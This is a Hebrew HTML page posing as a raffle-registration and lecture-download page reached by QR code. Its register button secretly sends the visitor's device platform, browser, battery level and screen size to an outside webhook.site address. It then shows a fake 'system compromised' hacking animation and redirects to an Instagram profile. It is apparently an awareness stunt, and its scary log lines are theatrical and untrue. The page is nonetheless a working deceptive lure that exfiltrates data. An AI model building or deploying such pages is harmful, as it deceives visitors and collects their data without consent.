<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>מבצע נובל למצוינות - הגרלה</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; transition: background 0.5s; overflow: hidden; }
        .card { background: white; padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; z-index: 1; transition: all 0.5s; }
        h1 { color: #1a73e8; margin-bottom: 10px; }
        p { color: #5f6368; line-height: 1.6; }
        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s, background 0.2s; margin-top: 20px; }
        button:hover { transform: scale(1.05); background: #1557b0; }
        
        /* מצב פריצה */
        .hacked-body { background-color: #000; color: #0f0; }
        .progress-container { display: none; margin-top: 25px; border: 1px solid #0f0; position: relative; height: 25px; }
        .progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.1s; }
        #log { font-family: 'Courier New', Courier, monospace; font-size: 13px; margin-top: 15px; text-align: left; height: 80px; overflow: hidden; line-height: 1.4; color: #0f0; }
        .warning { color: #ff0000; font-weight: bold; display: none; margin-top: 10px; animation: blink 0.5s infinite; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.1;} 100% {opacity: 1;} }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <div id="content-normal">
        <h1>הגרלת נובל 2026! 🎁</h1>
        <p>סרקתם והגעתם למקום הנכון. לחצו על הכפתור למטה כדי להירשם להגרלת הפרסים ולהורדת חומרי ההרצאה.</p>
        <button onclick="startExploit()">הרשמה מהירה</button>
    </div>

    <div class="progress-container" id="exploitBox">
        <div class="progress-bar" id="bar"></div>
    </div>
    <div id="log"></div>
    <div id="finalWarning" class="warning">SYSTEM COMPROMISED - DATA EXFILTRATED</div>
</div>

<script>
    async function startExploit() {
        const mainCard = document.getElementById('mainCard');
        const logBox = document.getElementById('log');
        
        // 1. שינוי ויזואלי מיידי
        document.body.classList.add('hacked-body');
        mainCard.style.background = '#111';
        mainCard.style.borderColor = '#0f0';
        document.getElementById('content-normal').style.display = 'none';
        document.getElementById('exploitBox').style.display = 'block';

        // 2. איסוף נתונים (כולל סוללה)
        let batteryLevel = "Unknown";
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + "%";
        } catch (e) { /* Battery API not supported */ }

        const payload = {
            status: "INFILTRATED",
            device: navigator.platform,
            browser: navigator.userAgent.split(' ').pop(),
            battery: batteryLevel,
            screen: `${window.screen.width}x${window.screen.height}`,
            time: new Date().toLocaleTimeString()
        };

        // שליחת הנתונים ל-Webhook (זכור להחליף את ה-URL)
        const webhookUrl = 'https://webhook.site/5de4be8b-0a26-4497-ad42-ac349b9f40af'; 
        const encodedData = btoa(JSON.stringify(payload));
        fetch(`${webhookUrl}?token=admin_bypass&data=${encodedData}`, { mode: 'no-cors' });

        // 3. אנימציית לוגים "מפחידה"
        const logs = [
            "> Establishing connection to CNC server...",
            "> Connection encrypted via AES-256",
            "> Searching for local vulnerabilities...",
            `> Found device: ${payload.device}`,
            `> Battery status: ${payload.battery} - Accessing power management...`,
            "> Extracting browser history tokens...",
            "> Bypassing sandbox security...",
            "> Uploading sensitive_data.zip to cloud...",
            "> Cleaning tracks..."
        ];

        let i = 0;
        const bar = document.getElementById('bar');
        
        const interval = setInterval(() => {
            i += 1;
            bar.style.width = i + "%";
            
            if (i % 11 === 0 && logs.length > 0) {
                const line = document.createElement('div');
                line.innerText = logs.shift();
                logBox.appendChild(line);
                logBox.scrollTop = logBox.scrollHeight;
            }

            if (i >= 100) {
                clearInterval(interval);
                document.getElementById('finalWarning').style.display = 'block';
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com/elisamuelson_/?hl=en";
                }, 1500);
            }
        }, 40);
    }
</script>

</body>
</html>
